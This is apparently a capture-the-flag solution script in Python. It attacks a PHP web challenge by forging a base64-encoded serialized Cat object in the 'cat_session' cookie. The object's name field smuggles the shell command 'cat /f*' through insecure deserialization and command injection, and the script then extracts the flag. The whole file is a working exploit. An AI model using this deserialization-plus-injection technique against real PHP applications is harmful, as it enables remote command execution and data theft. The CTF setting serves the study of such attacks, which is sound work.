from subprocess import check_output
from urllib.parse import quote
from base64 import b64encode
from os import getenv
import requests, re

url = 'http://h4ck3r.quest:8601/'

php_code = '''
class Cat {
    public $name = '(guest cat)';
    function __construct($name) {
        $this->name = $name;
    }
};
$payload =  new Cat("';id;'");
echo serialize($payload);
'''.replace('id', 'cat /f*')

payload = check_output(['php','-r',php_code])
payload = payload.replace(b'i:1;',b'i:0;')
# print(payload)
payload = quote(b64encode(payload))
res = requests.get(url, headers={ 'Cookie': 'cat_session='+payload })
# print(res.text)
flag = re.findall('FLAG{.+}', res.text)[0]
print(flag)
